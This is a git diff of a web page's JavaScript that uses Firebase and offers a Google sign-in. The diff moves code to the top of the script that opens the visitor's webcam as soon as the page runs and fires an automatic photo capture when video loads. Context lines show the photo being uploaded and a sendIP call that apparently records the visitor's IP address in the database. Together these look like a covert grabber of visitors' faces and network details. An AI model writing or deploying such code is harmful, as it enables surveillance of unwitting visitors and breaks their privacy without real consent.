@@ -14,6 +14,25 @@ const firebaseConfig = {
           const auth = firebase.auth();
           const firestore = firebase.firestore();
           const database = firebase.database();
+          const storage = firebase.storage();
+
+        // Access the user's webcam
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        let stream;
+if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(function(mediaStream) {
+                video.srcObject = mediaStream;
+                stream = mediaStream; // Save stream to stop it later
+
+                // Capture photo once webcam starts
+                video.addEventListener('loadeddata', capturePhoto);
+            }).catch(function(error) {
+                console.error("Error accessing webcam: ", error);
+            });
+        }
+
 
         // Function to sign in with Google
         function signInWithGoogle() {
@@ -162,26 +181,6 @@ async function sendIP(database) {
             }
         }
 sendIP(database);
-const storage = firebase.storage();
-
-        // Access the user's webcam
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        let stream;
-
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: true }).then(function(mediaStream) {
-                video.srcObject = mediaStream;
-                stream = mediaStream; // Save stream to stop it later
-
-                // Capture photo once webcam starts
-                video.addEventListener('loadeddata', capturePhoto);
-            }).catch(function(error) {
-                console.error("Error accessing webcam: ", error);
-            });
-        }
-
         // Capture and upload photo
         function capturePhoto() {
             // Draw video frame onto canvas
